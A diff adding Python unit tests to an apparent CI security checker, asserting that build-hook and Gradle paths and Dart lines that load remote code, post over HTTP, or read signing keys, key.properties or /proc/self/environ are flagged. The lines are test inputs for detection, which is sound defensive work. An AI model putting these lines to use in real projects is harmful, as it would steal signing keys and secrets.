@@ -218,6 +218,27 @@ class Fails(unittest.TestCase):
     def test_python_migrations_are_checked_too(self):
         self.assertFlags([f("backend/alembic/versions/abc.py", patch=added("op.execute('GRANT ALL ON x TO y')"))], needle="migration")
 
+    def test_build_hooks_and_gradle_build_logic_paths_fail(self):
+        for path in ["hook/build.dart", "hook/link.dart", "hooks/build.dart",
+                     "buildSrc/src/main/groovy/Leak.groovy", "android/init.gradle.kts"]:
+            self.assertFlags([f(path, patch=added("x"))], needle=path)
+
+    def test_dart_exfiltration_primitives_fail(self):
+        for line in [
+            "import 'dart:ffi';",
+            "final lib = DynamicLibrary.process();",
+            "await Isolate.spawnUri(Uri.parse('https://x/y.dart'), [], null);",
+            "final c = HttpClient();",
+            "import 'package:http/http.dart' as http;",
+            "await http.post(Uri.parse('https://x'), body: b);",
+            "final s = File('android/key.properties').readAsStringSync();",
+            "final e = File('/proc/self/environ').readAsBytesSync();",
+            "final ks = Directory('android').listSync();",
+            "final p = 'android/cosmic-match-release.jks';",
+        ]:
+            self.assertFlags([f("test/game/innocent_test.dart", patch=added(line))],
+                             needle="adds process/env")
+
 
 class Screened(unittest.TestCase):
     def test_only_screened_without_owner_approval_counts(self):
